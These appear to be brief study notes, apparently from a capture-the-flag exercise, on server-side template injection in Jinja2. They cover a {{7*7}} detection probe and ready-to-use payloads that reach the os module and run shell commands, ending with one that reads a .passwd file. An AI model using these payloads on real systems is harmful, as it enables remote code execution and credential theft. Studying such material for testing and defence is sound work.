# Python - Server-side Template Injection Introduction

Reference:

https://www.vaadata.com/blog/server-side-template-injection-vulnerability-what-it-is-how-to-prevent-it/

https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/

Possible Usage: To the site where user can upload the posts. If our request is interpreted, then it is executable.

How to identify: \{{7\*7\}}, if that payload is executed-> then it is vulnerable(not sanitized)

\->

What is a server-side template injection (SSTI) vulnerability?

Some web applications use template engines to separate the visual presentation (HTML, CSS…) from the application logic (PHP, Python…). These engines allow the creation of template files in the application. Templates are a mixture of fixed data (layout) and dynamic data (variables). When the application is used, the template engine will replace the variables contained in a template with values and will transform the template into a web page (HTML) and then send it to the client.

\->

There was a post about how to find the exploitable module for jinja:

and that said: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}`

```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os }}

{{ self._TemplateReference__context.namespace.__init__.__globals__.os }}
```

are context-free payloads

then enter

`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`

into the input field for post, for check.

`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -la').read() }}` to find .passwd

\-> Finally `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat .passwd').read() }}`
